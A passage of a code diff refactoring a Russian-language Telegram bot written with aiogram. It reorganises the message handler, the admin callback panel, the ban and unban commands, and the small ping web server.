-        "• Данные пользователя удалены\n\n"
-        "📱 Можете снова подключить аккаунт через кнопку «Подключить аккаунт для групп».",
+        "• Данные пользователя удалены",
         parse_mode="HTML",
         reply_markup=ReplyKeyboardRemove()
     )
 
-# ---- ОСНОВНОЙ ОБРАБОТЧИК СООБЩЕНИЙ ----
+# ==================== ОСНОВНОЙ ОБРАБОТЧИК ====================
 @dp.message()
 @dp.business_message()
 async def handle(message: Message):
     global bot_id, CHANNEL_LINK
-    
     try:
         if not message.from_user or message.from_user.is_bot: return
         uid = int(message.from_user.id)
@@ -1128,22 +965,16 @@ async def handle(message: Message):
 
         if not is_from_me: return
 
-        if uid in mutes and datetime.now() < mutes[uid]["until"]:
-            await delete_msg(chat_id, message.message_id, bc_id)
-            return
-
         if chat_id in reply_guard_chats and message.reply_to_message:
             await delete_msg(chat_id, message.message_id, bc_id)
             return
 
         text_raw = message.text
         if not text_raw: return
-        
         low = text_raw.lower().strip()
         task_key = (chat_id, bc_id)
         current_owner = owner_id or uid
 
-        # КАЛЬКУЛЯТОР
         if is_calculator_expression(text_raw):
             result, error = calculate_expression(text_raw)
             if result is not None:
@@ -1165,7 +996,7 @@ async def handle(message: Message):
                 except Exception as e: logging.error(f"Ошибка калькулятора: {e}")
                 return
 
-        # Обработка команд
+        # Команды
         if low == ".стоп":
             save_setting(chat_id, 'enabled_links', False)
             await clear_cmd(chat_id, message.message_id, bc_id)
@@ -1244,11 +1075,9 @@ async def handle(message: Message):
                 else:
                     target_id = chat_id
                     target_name = message.chat.first_name or "Пользователь"
-                
                 mutes[target_id] = {"until": datetime.now() + timedelta(minutes=minutes)}
                 asyncio.create_task(unmute(target_id, chat_id, bc_id, target_name))
                 await clear_cmd(chat_id, message.message_id, bc_id)
-                
                 user_link = get_user_mention(target_id, target_name)
                 kwargs = {
                     "chat_id": chat_id,
@@ -1319,33 +1148,336 @@ async def handle(message: Message):
         final_text = text_raw
         need_modify = False
         parse_mode = None
-
         if chat_id in substitutions:
             sub = substitutions[chat_id]
             final_text = f"{sub['text']} {text_raw}" if sub["mode"] == 1 else f"{text_raw} {sub['text']}"
             need_modify = True
             parse_mode = "HTML"
-
-        if chat_id in link_chats:
-            if CHANNEL_LINK:
-                has_link = False
-                if message.entities:
-                    for entity in message.entities:
-                        if entity.type in ["url", "text_link"]:
-                            has_link = True
-                            break
-                if not has_link and CHANNEL_LINK not in final_text:
-                    final_text = f'<a href="{CHANNEL_LINK}">{final_text}</a>'
-                    need_modify = True
-                    parse_mode = "HTML"
-
+        if chat_id in link_chats and CHANNEL_LINK:
+            has_link = False
+            if message.entities:
+                for entity in message.entities:
+                    if entity.type in ["url", "text_link"]:
+                        has_link = True
+                        break
+            if not has_link and CHANNEL_LINK not in final_text:
+                final_text = f'<a href="{CHANNEL_LINK}">{final_text}</a>'
+                need_modify = True
+                parse_mode = "HTML"
         if need_modify:
             await edit_message(chat_id, message.message_id, final_text, bc_id, parse_mode=parse_mode)
 
     except Exception as e:
         logging.error(f"❌ Ошибка обработки сообщения: {e}")
 
-# ---- ОБРАБОТЧИК УДАЛЕНИЙ ----
+# ==================== ОБРАБОТЧИК КНОПОК ====================
+@dp.callback_query()
+async def process_callbacks(callback: CallbackQuery, state: FSMContext):
+    data = callback.data
+    uid = callback.from_user.id
+    
+    if data == "btn_features":
+        await callback.message.answer(TEXT_COMMANDS_HELP, parse_mode="HTML")
+        await callback.answer()
+        return
+    if data == "btn_how_to_connect":
+        await callback.answer()
+        return
+    if data == "btn_group_auth":
+        await group_auth(callback, state)
+        return
+    if data == "btn_admin_panel":
+        if uid != ADMIN_ID:
+            await callback.answer()
+            return
+        await callback.message.answer("👑 <b>Панель Администратора</b>", reply_markup=get_admin_keyboard(), parse_mode="HTML")
+        await callback.answer()
+        return
+    if uid != ADMIN_ID:
+        await callback.answer()
+        return
+    if data == "admin_panel_back":
+        await callback.message.edit_text("👑 <b>Панель Администратора</b>", reply_markup=get_admin_keyboard(), parse_mode="HTML")
+        await callback.answer()
+        return
+    if data == "admin_stats":
+        business_users = get_business_accounts()
+        manual_users = get_all_users()
+        total_manual = len([u for u in manual_users if u[4] == 'manual'])
+        total_chats = sum(len(get_user_chats(u[0])) for u in manual_users)
+        await callback.message.edit_text(
+            f"📊 <b>СТАТИСТИКА:</b>\n\n"
+            f"• Бизнес-аккаунтов: <code>{len(business_users)}</code>\n"
+            f"• Ручных пользователей: <code>{total_manual}</code>\n"
+            f"• Всего пользователей: <code>{len(manual_users)}</code>\n"
+            f"• Всего чатов: <code>{total_chats}</code>\n"
+            f"• Забанено: <code>{len(banned_users)}</code>",
+            reply_markup=get_admin_keyboard(), parse_mode="HTML"
+        )
+        await callback.answer()
+        return
+    if data == "admin_users":
+        await callback.message.edit_text(
+            "👥 <b>ВСЕ ПОЛЬЗОВАТЕЛИ</b>\n\n"
+            "Выберите пользователя для управления:",
+            reply_markup=get_users_keyboard(0),
+            parse_mode="HTML"
+        )
+        await callback.answer()
+        return
+    if data.startswith("users_page_"):
+        page = int(data.split("_")[2])
+        await callback.message.edit_text(
+            "👥 <b>ВСЕ ПОЛЬЗОВАТЕЛИ</b>\n\n"
+            "Выберите пользователя для управления:",
+            reply_markup=get_users_keyboard(page),
+            parse_mode="HTML"
+        )
+        await callback.answer()
+        return
+    if data.startswith("user_"):
+        user_id = int(data.split("_")[1])
+        user_link = get_user_mention(user_id)
+        chats = get_user_chats(user_id)
+        chats_count = len(chats)
+        kb = InlineKeyboardMarkup(inline_keyboard=[
+            [InlineKeyboardButton(text=f"📋 Чаты ({chats_count})", callback_data=f"view_chats_{user_id}")],
+            [InlineKeyboardButton(text="❌ Удалить из списка", callback_data=f"delete_user_{user_id}")],
+            [InlineKeyboardButton(text="🚫 Забанить", callback_data=f"ban_user_{user_id}")],
+            [InlineKeyboardButton(text="🔙 Назад", callback_data="admin_users")]
+        ])
+        await callback.message.edit_text(
+            f"👤 <b>Информация о пользователе</b>\n\n"
+            f"ID: <code>{user_id}</code>\n"
+            f"Имя: {user_link}\n"
+            f"Чатов: <code>{chats_count}</code>",
+            reply_markup=kb,
+            parse_mode="HTML"
+        )
+        await callback.answer()
+        return
+    if data.startswith("view_chats_"):
+        user_id = int(data.split("_")[2])
+        user_first_name = user_names.get(user_id, "Пользователь")
+        chats = get_user_chats(user_id)
+        if not chats:
+            await callback.message.edit_text(
+                f"📋 <b>Чаты пользователя {get_user_mention(user_id, user_first_name)}</b>\n\n"
+                f"❌ У пользователя нет сохраненных чатов.",
+                reply_markup=InlineKeyboardMarkup(inline_keyboard=[
+                    [InlineKeyboardButton(text="🔙 Назад к пользователю", callback_data=f"user_{user_id}")]
+                ]),
+                parse_mode="HTML"
+            )
+            await callback.answer()
+            return
+        await callback.message.edit_text(
+            f"📋 <b>Чаты пользователя {get_user_mention(user_id, user_first_name)}</b>\n\n"
+            f"Всего чатов: <code>{len(chats)}</code>\n\n"
+            f"Нажмите на чат, чтобы удалить его:",
+            reply_markup=get_user_chats_keyboard(user_id, 0),
+            parse_mode="HTML"
+        )
+        await callback.answer()
+        return
+    if data.startswith("chats_page_"):
+        parts = data.split("_")
+        user_id = int(parts[2])
+        page = int(parts[3])
+        user_first_name = user_names.get(user_id, "Пользователь")
+        chats = get_user_chats(user_id)
+        await callback.message.edit_text(
+            f"📋 <b>Чаты пользователя {get_user_mention(user_id, user_first_name)}</b>\n\n"
+            f"Всего чатов: <code>{len(chats)}</code>\n\n"
+            f"Нажмите на чат, чтобы удалить его:",
+            reply_markup=get_user_chats_keyboard(user_id, page),
+            parse_mode="HTML"
+        )
+        await callback.answer()
+        return
+    if data.startswith("delete_chat_"):
+        parts = data.split("_")
+        user_id = int(parts[2])
+        chat_id = int(parts[3])
+        chat_name = ""
+        chats = get_user_chats(user_id)
+        for cid, name in chats:
+            if cid == chat_id:
+                chat_name = name
+                break
+        confirm_kb = InlineKeyboardMarkup(inline_keyboard=[
+            [InlineKeyboardButton(text="✅ Да, удалить", callback_data=f"confirm_delete_chat_{user_id}_{chat_id}")],
+            [InlineKeyboardButton(text="❌ Отмена", callback_data=f"view_chats_{user_id}")]
+        ])
+        await callback.message.edit_text(
+            f"⚠️ <b>ВНИМАНИЕ!</b>\n\n"
+            f"Вы уверены, что хотите удалить чат <b>«{chat_name}»</b> у пользователя {get_user_mention(user_id)}?\n\n"
+            f"<b>Это действие необратимо!</b>",
+            reply_markup=confirm_kb,
+            parse_mode="HTML"
+        )
+        await callback.answer()
+        return
+    if data.startswith("confirm_delete_chat_"):
+        parts = data.split("_")
+        user_id = int(parts[3])
+        chat_id = int(parts[4])
+        delete_user_chat(user_id, chat_id)
+        await callback.answer("✅ Чат удален!", show_alert=True)
+        user_first_name = user_names.get(user_id, "Пользователь")
+        chats = get_user_chats(user_id)
+        await callback.message.edit_text(
+            f"📋 <b>Чаты пользователя {get_user_mention(user_id, user_first_name)}</b>\n\n"
+            f"Всего чатов: <code>{len(chats)}</code>\n\n"
+            f"Нажмите на чат, чтобы удалить его:",
+            reply_markup=get_user_chats_keyboard(user_id, 0),
+            parse_mode="HTML"
+        )
+        await callback.answer()
+        return
+    if data.startswith("delete_all_chats_"):
+        user_id = int(data.split("_")[3])
+        user_first_name = user_names.get(user_id, "Пользователь")
+        chats = get_user_chats(user_id)
+        if not chats:
+            await callback.answer("❌ У пользователя нет чатов!", show_alert=True)
+            return
+        confirm_kb = InlineKeyboardMarkup(inline_keyboard=[
+            [InlineKeyboardButton(text="✅ Да, удалить ВСЕ", callback_data=f"confirm_delete_all_chats_{user_id}")],
+            [InlineKeyboardButton(text="❌ Отмена", callback_data=f"view_chats_{user_id}")]
+        ])
+        await callback.message.edit_text(
+            f"⚠️ <b>ВНИМАНИЕ!</b>\n\n"
+            f"Вы уверены, что хотите удалить <b>ВСЕ ЧАТЫ</b> пользователя {get_user_mention(user_id, user_first_name)}?\n\n"
+            f"Будет удалено <code>{len(chats)}</code> чатов.\n\n"
+            f"<b>Это действие необратимо!</b>",
+            reply_markup=confirm_kb,
+            parse_mode="HTML"
+        )
+        await callback.answer()
+        return
+    if data.startswith("confirm_delete_all_chats_"):
+        user_id = int(data.split("_")[4])
+        user_first_name = user_names.get(user_id, "Пользователь")
+        count = delete_all_user_chats(user_id)
+        await callback.answer(f"✅ Удалено {count} чатов!", show_alert=True)
+        await callback.message.edit_text(
+            f"📋 <b>Чаты пользователя {get_user_mention(user_id, user_first_name)}</b>\n\n"
+            f"❌ Все чаты удалены.",
+            reply_markup=InlineKeyboardMarkup(inline_keyboard=[
+                [InlineKeyboardButton(text="🔙 Назад к пользователю", callback_data=f"user_{user_id}")]
+            ]),
+            parse_mode="HTML"
+        )
+        await callback.answer()
+        return
+    if data.startswith("delete_user_"):
+        user_id = int(data.split("_")[2])
+        delete_business_account(user_id)
+        await callback.answer("✅ Пользователь удален из списка!", show_alert=True)
+        await callback.message.edit_text(
+            "👥 <b>ВСЕ ПОЛЬЗОВАТЕЛИ</b>\n\n"
+            "Выберите пользователя для управления:",
+            reply_markup=get_users_keyboard(0),
+            parse_mode="HTML"
+        )
+        await callback.answer()
+        return
+    if data.startswith("ban_user_"):
+        user_id = int(data.split("_")[2])
+        if user_id in banned_users:
+            set_user_ban(user_id, False)
+            await callback.answer("✅ Пользователь разбанен!", show_alert=True)
+        else:
+            set_user_ban(user_id, True)
+            await callback.answer("🚫 Пользователь забанен!", show_alert=True)
+        user_link = get_user_mention(user_id)
+        status = "забанен" if user_id in banned_users else "разбанен"
+        chats = get_user_chats(user_id)
+        chats_count = len(chats)
+        await callback.message.edit_text(
+            f"👤 <b>Информация о пользователе</b>\n\n"
+            f"ID: <code>{user_id}</code>\n"
+            f"Имя: {user_link}\n"
+            f"Статус: {status}\n"
+            f"Чатов: <code>{chats_count}</code>\n\n"
+            f"Выберите действие:",
+            reply_markup=InlineKeyboardMarkup(inline_keyboard=[
+                [InlineKeyboardButton(text=f"📋 Чаты ({chats_count})", callback_data=f"view_chats_{user_id}")],
+                [InlineKeyboardButton(text="❌ Удалить из списка", callback_data=f"delete_user_{user_id}")],
+                [InlineKeyboardButton(text="🚫 Забанить/Разбанить", callback_data=f"ban_user_{user_id}")],
+                [InlineKeyboardButton(text="🔙 Назад", callback_data="admin_users")]
+            ]),
+            parse_mode="HTML"
+        )
+        await callback.answer()
+        return
+    if data == "admin_ban_prompt":
+        await callback.message.edit_text(
+            "🚫 <b>Управление банами</b>\n\n"
+            "Команды бана/разбана:\n\n"
+            "• <code>/ban 123456789</code> или <code>/ban @username</code>\n"
+            "• <code>/unban 123456789</code> или <code>/unban @username</code>",
+            reply_markup=get_admin_keyboard(), parse_mode="HTML"
+        )
+        await callback.answer()
+        return
+    if data == "admin_add_user":
+        await callback.message.edit_text(
+            "➕ <b>Добавление пользователя</b>\n\n"
+            "Отправьте ID или @username пользователя.",
+            reply_markup=InlineKeyboardMarkup(inline_keyboard=[
+                [InlineKeyboardButton(text="🔙 Назад", callback_data="admin_panel_back")]
+            ]),
+            parse_mode="HTML"
+        )
+        await callback.answer()
+        return
+    await callback.answer()
+
+# ==================== АДМИН-КОМАНДЫ ====================
+async def resolve_user_id(target_raw: str):
+    target = target_raw.strip()
+    if target.startswith("@"):
+        uname = target.lstrip("@").lower()
+        res = user_usernames.get(uname)
+        return int(res) if res else None
+    elif target.isdigit():
+        return int(target)
+    return None
+
+@dp.message(Command("ban"))
+async def cmd_ban(message: Message):
+    if message.from_user.id != ADMIN_ID: return
+    try:
+        arg = message.text.split(maxsplit=1)[1]
+        target_id = await resolve_user_id(arg)
+        if target_id:
+            set_user_ban(target_id, True)
+            delete_business_account(target_id)
+            user_link = get_user_mention(target_id)
+            await message.answer(f"🚫 {user_link} <b>заблокирован</b>!", parse_mode="HTML")
+        else:
+            await message.answer(f"❌ Пользователь <code>{arg}</code> не найден.", parse_mode="HTML")
+    except:
+        await message.answer("Формат: <code>/ban 123456789</code> или <code>/ban @username</code>", parse_mode="HTML")
+
+@dp.message(Command("unban"))
+async def cmd_unban(message: Message):
+    if message.from_user.id != ADMIN_ID: return
+    try:
+        arg = message.text.split(maxsplit=1)[1]
+        target_id = await resolve_user_id(arg)
+        if target_id:
+            set_user_ban(target_id, False)
+            user_link = get_user_mention(target_id)
+            await message.answer(f"✅ {user_link} <b>разблокирован</b>!", parse_mode="HTML")
+        else:
+            await message.answer(f"❌ Пользователь <code>{arg}</code> не найден.", parse_mode="HTML")
+    except:
+        await message.answer("Формат: <code>/unban 123456789</code> или <code>/unban @username</code>", parse_mode="HTML")
+
+# ==================== ОБРАБОТЧИК УДАЛЕНИЙ ====================
 @dp.update()
 async def global_update_handler(update: Update, bot: Bot):
     try:
@@ -1376,391 +1508,7 @@ async def global_update_handler(update: Update, bot: Bot):
     except Exception as e:
         logging.error(f"❌ Ошибка обработчика удалений: {e}")
 
-# ---- АДМИН-КОМАНДЫ ----
-async def resolve_user_id(target_raw: str):
-    target = target_raw.strip()
-    if target.startswith("@"):
-        uname = target.lstrip("@").lower()
-        res = user_usernames.get(uname)
-        return int(res) if res else None
-    elif target.isdigit():
-        return int(target)
-    return None
-
-@dp.message(Command("ban"))
-async def cmd_ban(message: Message):
-    if message.from_user.id != ADMIN_ID: return
-    try:
-        arg = message.text.split(maxsplit=1)[1]
-        target_id = await resolve_user_id(arg)
-        if target_id:
-            set_user_ban(target_id, True)
-            delete_business_account(target_id)
-            delete_manual_user(target_id)
-            user_link = get_user_mention(target_id)
-            await message.answer(f"🚫 {user_link} <b>заблокирован</b>!", parse_mode="HTML")
-        else:
-            await message.answer(f"❌ Пользователь <code>{arg}</code> не найден.", parse_mode="HTML")
-    except:
-        await message.answer("Формат: <code>/ban 123456789</code> или <code>/ban @username</code>", parse_mode="HTML")
-
-@dp.message(Command("unban"))
-async def cmd_unban(message: Message):
-    if message.from_user.id != ADMIN_ID: return
-    try:
-        arg = message.text.split(maxsplit=1)[1]
-        target_id = await resolve_user_id(arg)
-        if target_id:
-            set_user_ban(target_id, False)
-            user_link = get_user_mention(target_id)
-            await message.answer(f"✅ {user_link} <b>разблокирован</b>!", parse_mode="HTML")
-        else:
-            await message.answer(f"❌ Пользователь <code>{arg}</code> не найден.", parse_mode="HTML")
-    except:
-        await message.answer("Формат: <code>/unban 123456789</code> или <code>/unban @username</code>", parse_mode="HTML")
-
-# ---- ОБРАБОТЧИКИ ДОБАВЛЕНИЯ ПОЛЬЗОВАТЕЛЕЙ ----
-@dp.callback_query(F.data == "admin_add_user")
-async def admin_add_user(callback: CallbackQuery):
-    if callback.from_user.id != ADMIN_ID:
-        await callback.answer()
-        return
-    
-    await callback.message.edit_text(
-        "➕ <b>Добавление пользователя</b>\n\n"
-        "Отправьте ID или @username пользователя, которого хотите добавить.\n"
-        "Например: <code>123456789</code> или <code>@username</code>\n\n"
-        "Чтобы отменить, нажмите кнопку «Назад».",
-        reply_markup=InlineKeyboardMarkup(inline_keyboard=[
-            [InlineKeyboardButton(text="🔙 Назад", callback_data="admin_panel_back")]
-        ]),
-        parse_mode="HTML"
-    )
-    await callback.answer()
-
-@dp.message()
-async def handle_add_user(message: Message):
-    if message.from_user.id != ADMIN_ID: return
-    if message.text and (message.text.startswith("@") or (message.text.isdigit() and len(message.text) > 5)):
-        target = message.text.strip()
-        target_id = await resolve_user_id(target)
-        
-        if target_id:
-            users = get_all_users()
-            existing = [u for u in users if u[0] == target_id]
-            
-            if existing:
-                await message.answer(f"ℹ️ Пользователь уже есть в списке.")
-            else:
-                try:
-                    user_info = await bot.get_chat(target_id)
-                    username = user_info.username or None
-                    first_name = user_info.first_name or "Пользователь"
-                    save_manual_user(target_id, username, first_name)
-                    save_user_info(target_id, username, first_name)
-                    
-                    user_link = get_user_mention(target_id, first_name)
-                    await message.answer(f"✅ {user_link} <b>добавлен</b> в список пользователей!", parse_mode="HTML")
-                except Exception as e:
-                    await message.answer(f"❌ Ошибка при добавлении: {str(e)}")
-        else:
-            await message.answer(f"❌ Пользователь <code>{target}</code> не найден.", parse_mode="HTML")
-
-# ---- ОБРАБОТЧИКИ АДМИН-КНОПОК ----
-@dp.callback_query()
-async def process_callbacks(callback: CallbackQuery, state: FSMContext):
-    data = callback.data
-    uid = callback.from_user.id
-    
-    if data == "btn_features":
-        await callback.message.answer(TEXT_COMMANDS_HELP, parse_mode="HTML")
-        await callback.answer()
-        return
-    if data == "btn_how_to_connect":
-        await callback.answer()
-        return
-    if data == "btn_group_auth":
-        await group_auth(callback, state)
-        return
-    
-    if data == "btn_admin_panel":
-        if uid != ADMIN_ID:
-            await callback.answer()
-            return
-        await callback.message.answer("👑 <b>Панель Администратора</b>", reply_markup=get_admin_keyboard(), parse_mode="HTML")
-        await callback.answer()
-        return
-
-    if uid != ADMIN_ID:
-        await callback.answer()
-        return
-
-    if data == "admin_panel_back":
-        await callback.message.edit_text("👑 <b>Панель Администратора</b>", reply_markup=get_admin_keyboard(), parse_mode="HTML")
-        await callback.answer()
-        return
-
-    if data == "admin_stats":
-        business_users = get_business_accounts()
-        manual_users = get_all_users()
-        total_manual = len([u for u in manual_users if u[4] == 'manual'])
-        
-        total_chats = sum(len(get_user_chats(u[0])) for u in manual_users)
-        
-        await callback.message.edit_text(
-            f"📊 <b>СТАТИСТИКА:</b>\n\n"
-            f"• Бизнес-аккаунтов: <code>{len(business_users)}</code>\n"
-            f"• Ручных пользователей: <code>{total_manual}</code>\n"
-            f"• Всего пользователей: <code>{len(manual_users)}</code>\n"
-            f"• Всего чатов: <code>{total_chats}</code>\n"
-            f"• Забанено: <code>{len(banned_users)}</code>",
-            reply_markup=get_admin_keyboard(), parse_mode="HTML"
-        )
-        
-    elif data == "admin_users":
-        await callback.message.edit_text(
-            "👥 <b>ВСЕ ПОЛЬЗОВАТЕЛИ</b>\n\n"
-            "📱 — подключены через бизнес-аккаунт\n"
-            "👤 — добавлены вручную\n"
-            "В скобках указано количество чатов\n\n"
-            "Выберите пользователя для управления:",
-            reply_markup=get_users_keyboard(0),
-            parse_mode="HTML"
-        )
-        
-    elif data.startswith("users_page_"):
-        page = int(data.split("_")[2])
-        await callback.message.edit_text(
-            "👥 <b>ВСЕ ПОЛЬЗОВАТЕЛИ</b>\n\n"
-            "📱 — подключены через бизнес-аккаунт\n"
-            "👤 — добавлены вручную\n"
-            "В скобках указано количество чатов\n\n"
-            "Выберите пользователя для управления:",
-            reply_markup=get_users_keyboard(page),
-            parse_mode="HTML"
-        )
-        
-    elif data.startswith("user_"):
-        user_id = int(data.split("_")[1])
-        
-        users = get_all_users()
-        user_info = None
-        user_type = "unknown"
-        for u in users:
-            if u[0] == user_id:
-                user_info = u
-                user_type = u[4]
-                break
-        
-        user_link = get_user_mention(user_id)
-        chats = get_user_chats(user_id)
-        chats_count = len(chats)
-        
-        kb = InlineKeyboardMarkup(inline_keyboard=[
-            [InlineKeyboardButton(text=f"📋 Чаты ({chats_count})", callback_data=f"view_chats_{user_id}")],
-            [InlineKeyboardButton(text="❌ Удалить из списка", callback_data=f"delete_user_{user_id}")],
-            [InlineKeyboardButton(text="🚫 Забанить", callback_data=f"ban_user_{user_id}")],
-            [InlineKeyboardButton(text="🔙 Назад", callback_data="admin_users")]
-        ])
-        
-        type_text = "📱 Бизнес-аккаунт" if user_type == "business" else "👤 Ручное добавление"
-        await callback.message.edit_text(
-            f"👤 <b>Информация о пользователе</b>\n\n"
-            f"ID: <code>{user_id}</code>\n"
-            f"Имя: {user_link}\n"
-            f"Тип: {type_text}\n"
-            f"Чатов: <code>{chats_count}</code>\n\n"
-            f"Выберите действие:",
-            reply_markup=kb,
-            parse_mode="HTML"
-        )
-        
-    elif data.startswith("view_chats_"):
-        user_id = int(data.split("_")[2])
-        user_first_name = user_names.get(user_id, "Пользователь")
-        
-        chats = get_user_chats(user_id)
-        
-        if not chats:
-            await callback.message.edit_text(
-                f"📋 <b>Чаты пользователя {get_user_mention(user_id, user_first_name)}</b>\n\n"
-                f"❌ У пользователя нет сохраненных чатов.",
-                reply_markup=InlineKeyboardMarkup(inline_keyboard=[
-                    [InlineKeyboardButton(text="🔙 Назад к пользователю", callback_data=f"user_{user_id}")]
-                ]),
-                parse_mode="HTML"
-            )
-            await callback.answer()
-            return
-        
-        await callback.message.edit_text(
-            f"📋 <b>Чаты пользователя {get_user_mention(user_id, user_first_name)}</b>\n\n"
-            f"Всего чатов: <code>{len(chats)}</code>\n\n"
-            f"Нажмите на чат, чтобы удалить его:",
-            reply_markup=get_user_chats_keyboard(user_id, 0),
-            parse_mode="HTML"
-        )
-        
-    elif data.startswith("chats_page_"):
-        parts = data.split("_")
-        user_id = int(parts[2])
-        page = int(parts[3])
-        
-        user_first_name = user_names.get(user_id, "Пользователь")
-        chats = get_user_chats(user_id)
-        
-        await callback.message.edit_text(
-            f"📋 <b>Чаты пользователя {get_user_mention(user_id, user_first_name)}</b>\n\n"
-            f"Всего чатов: <code>{len(chats)}</code>\n\n"
-            f"Нажмите на чат, чтобы удалить его:",
-            reply_markup=get_user_chats_keyboard(user_id, page),
-            parse_mode="HTML"
-        )
-        
-    elif data.startswith("delete_chat_"):
-        parts = data.split("_")
-        user_id = int(parts[2])
-        chat_id = int(parts[3])
-        
-        chat_name = ""
-        chats = get_user_chats(user_id)
-        for cid, name in chats:
-            if cid == chat_id:
-                chat_name = name
-                break
-        
-        confirm_kb = InlineKeyboardMarkup(inline_keyboard=[
-            [InlineKeyboardButton(text="✅ Да, удалить", callback_data=f"confirm_delete_chat_{user_id}_{chat_id}")],
-            [InlineKeyboardButton(text="❌ Отмена", callback_data=f"view_chats_{user_id}")]
-        ])
-        
-        await callback.message.edit_text(
-            f"⚠️ <b>ВНИМАНИЕ!</b>\n\n"
-            f"Вы уверены, что хотите удалить чат <b>«{chat_name}»</b> у пользователя {get_user_mention(user_id)}?\n\n"
-            f"<b>Это действие необратимо!</b>",
-            reply_markup=confirm_kb,
-            parse_mode="HTML"
-        )
-        
-    elif data.startswith("confirm_delete_chat_"):
-        parts = data.split("_")
-        user_id = int(parts[3])
-        chat_id = int(parts[4])
-        
-        delete_user_chat(user_id, chat_id)
-        await callback.answer("✅ Чат удален!", show_alert=True)
-        
-        user_first_name = user_names.get(user_id, "Пользователь")
-        chats = get_user_chats(user_id)
-        
-        await callback.message.edit_text(
-            f"📋 <b>Чаты пользователя {get_user_mention(user_id, user_first_name)}</b>\n\n"
-            f"Всего чатов: <code>{len(chats)}</code>\n\n"
-            f"Нажмите на чат, чтобы удалить его:",
-            reply_markup=get_user_chats_keyboard(user_id, 0),
-            parse_mode="HTML"
-        )
-        
-    elif data.startswith("delete_all_chats_"):
-        user_id = int(data.split("_")[3])
-        user_first_name = user_names.get(user_id, "Пользователь")
-        chats = get_user_chats(user_id)
-        
-        if not chats:
-            await callback.answer("❌ У пользователя нет чатов!", show_alert=True)
-            return
-        
-        confirm_kb = InlineKeyboardMarkup(inline_keyboard=[
-            [InlineKeyboardButton(text="✅ Да, удалить ВСЕ", callback_data=f"confirm_delete_all_chats_{user_id}")],
-            [InlineKeyboardButton(text="❌ Отмена", callback_data=f"view_chats_{user_id}")]
-        ])
-        
-        await callback.message.edit_text(
-            f"⚠️ <b>ВНИМАНИЕ!</b>\n\n"
-            f"Вы уверены, что хотите удалить <b>ВСЕ ЧАТЫ</b> пользователя {get_user_mention(user_id, user_first_name)}?\n\n"
-            f"Будет удалено <code>{len(chats)}</code> чатов.\n\n"
-            f"<b>Это действие необратимо!</b>",
-            reply_markup=confirm_kb,
-            parse_mode="HTML"
-        )
-        
-    elif data.startswith("confirm_delete_all_chats_"):
-        user_id = int(data.split("_")[4])
-        user_first_name = user_names.get(user_id, "Пользователь")
-        
-        count = delete_all_user_chats(user_id)
-        await callback.answer(f"✅ Удалено {count} чатов!", show_alert=True)
-        
-        await callback.message.edit_text(
-            f"📋 <b>Чаты пользователя {get_user_mention(user_id, user_first_name)}</b>\n\n"
-            f"❌ Все чаты удалены.",
-            reply_markup=InlineKeyboardMarkup(inline_keyboard=[
-                [InlineKeyboardButton(text="🔙 Назад к пользователю", callback_data=f"user_{user_id}")]
-            ]),
-            parse_mode="HTML"
-        )
-        
-    elif data.startswith("delete_user_"):
-        user_id = int(data.split("_")[2])
-        delete_business_account(user_id)
-        delete_manual_user(user_id)
-        await callback.answer("✅ Пользователь удален из списка!", show_alert=True)
-        await callback.message.edit_text(
-            "👥 <b>ВСЕ ПОЛЬЗОВАТЕЛИ</b>\n\n"
-            "📱 — подключены через бизнес-аккаунт\n"
-            "👤 — добавлены вручную\n"
-            "В скобках указано количество чатов\n\n"
-            "Выберите пользователя для управления:",
-            reply_markup=get_users_keyboard(0),
-            parse_mode="HTML"
-        )
-        
-    elif data.startswith("ban_user_"):
-        user_id = int(data.split("_")[2])
-        if user_id in banned_users:
-            set_user_ban(user_id, False)
-            await callback.answer("✅ Пользователь разбанен!", show_alert=True)
-        else:
-            set_user_ban(user_id, True)
-            await callback.answer("🚫 Пользователь забанен!", show_alert=True)
-        
-        user_link = get_user_mention(user_id)
-        status = "забанен" if user_id in banned_users else "разбанен"
-        chats = get_user_chats(user_id)
-        chats_count = len(chats)
-        
-        await callback.message.edit_text(
-            f"👤 <b>Информация о пользователе</b>\n\n"
-            f"ID: <code>{user_id}</code>\n"
-            f"Имя: {user_link}\n"
-            f"Статус: {status}\n"
-            f"Чатов: <code>{chats_count}</code>\n\n"
-            f"Выберите действие:",
-            reply_markup=InlineKeyboardMarkup(inline_keyboard=[
-                [InlineKeyboardButton(text=f"📋 Чаты ({chats_count})", callback_data=f"view_chats_{user_id}")],
-                [InlineKeyboardButton(text="❌ Удалить из списка", callback_data=f"delete_user_{user_id}")],
-                [InlineKeyboardButton(text="🚫 Забанить/Разбанить", callback_data=f"ban_user_{user_id}")],
-                [InlineKeyboardButton(text="🔙 Назад", callback_data="admin_users")]
-            ]),
-            parse_mode="HTML"
-        )
-        
-    elif data == "admin_ban_prompt":
-        await callback.message.edit_text(
-            "🚫 <b>Управление банами</b>\n\n"
-            "Команды бана/разбана:\n\n"
-            "• <code>/ban 123456789</code> или <code>/ban @username</code>\n"
-            "• <code>/unban 123456789</code> или <code>/unban @username</code>\n\n"
-            "Также можно использовать кнопки в списке пользователей.",
-            reply_markup=get_admin_keyboard(), parse_mode="HTML"
-        )
-        
-    elif data == "admin_add_user":
-        await admin_add_user(callback)
-        
-    await callback.answer()
-
-# ---- ВЕБ-СЕРВЕР ----
+# ==================== ВЕБ-СЕРВЕР ====================
 async def handle_ping(request):
     return web.Response(text="Bot is running!")
 
@@ -1774,7 +1522,7 @@ async def start_web_server():
     site = web.TCPSite(runner, "0.0.0.0", port)
     await site.start()
 
-# ---- ЗАПУСК ----
+# ==================== ЗАПУСК ====================
 async def main():
     await start_web_server()
     try:
